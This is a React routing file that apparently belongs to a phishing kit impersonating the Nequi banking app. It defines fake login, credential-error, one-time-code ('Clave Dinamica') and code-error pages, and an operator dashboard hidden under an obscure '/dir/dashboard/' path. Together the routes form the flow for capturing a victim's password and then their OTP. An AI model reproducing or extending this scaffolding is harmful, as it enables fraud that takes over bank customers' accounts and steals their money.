import { BrowserRouter, Routes, Route } from 'react-router-dom';
import Home from './pages/HomePage';
import Loading from './components/loading/loading'
import LoginPage from './pages/LoginPage';
import Dashboard from './components/AdminPanel/Dashboard';
import ErrorHome from './pages/ErrorHome';
import OTPPage from './pages/OTPPage';
import OTPErrorPage from './pages/OTPErrorPage';
import './App.css';

function App() {
  return (
    <BrowserRouter>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/nequi/loading" element={<Loading />} />
          <Route path='/nequi/error_credentials' element={<ErrorHome />} /> // Error de Login
          <Route path='/nequi/ingreso/codigo_seguridad' element={<OTPPage />} /> // Clave Dinamica
          <Route path='/nequi/ingreso/codigo_seguridad_error' element={<OTPErrorPage />} /> // Error de Clave Dinamica
          <Route path='/dir/dashboard/prefir?' element={<LoginPage />} /> // Admin Login
          <Route path='/dir/dashboard/endpoint' element={<Dashboard />} /> // Admin Dashboard
        </Routes>
    </BrowserRouter>
  );
}

export default App;
